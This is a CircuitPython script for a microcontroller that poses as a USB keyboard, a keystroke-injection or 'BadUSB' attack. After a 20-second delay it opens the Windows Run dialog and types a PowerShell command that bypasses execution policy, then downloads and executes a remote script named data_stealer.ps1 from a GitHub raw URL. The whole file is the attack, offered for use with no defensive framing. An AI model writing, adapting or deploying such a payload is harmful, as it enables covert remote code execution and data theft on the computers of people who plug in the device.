print("started")
import time
import usb_hid
import board
import digitalio
import usb_cdc
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Setup LED
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

# Setup Keyboard
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)
print("20 seconds")
# 1. SAFETY WINDOW (20 Seconds)
time.sleep(20) 
print("openingrun")

# 2. Open 'Run' Dialog
keyboard.press(Keycode.GUI, Keycode.R)
time.sleep(0.2)
keyboard.release_all()
time.sleep(1.0)

# 3. THE PAYLOAD
# Ensure this link matches your RAW GitHub URL
url = "https://raw.githubusercontent.com/69420-ctrl/tuff-project/main/data_stealer.ps1"
payload = f"powershell -ExecutionPolicy Bypass -NoExit -c IEX(New-Object Net.WebClient).DownloadString('{url}')"
print("payload")
# 4. Execute
layout.write(payload)
time.sleep(0.5)
keyboard.send(Keycode.ENTER)
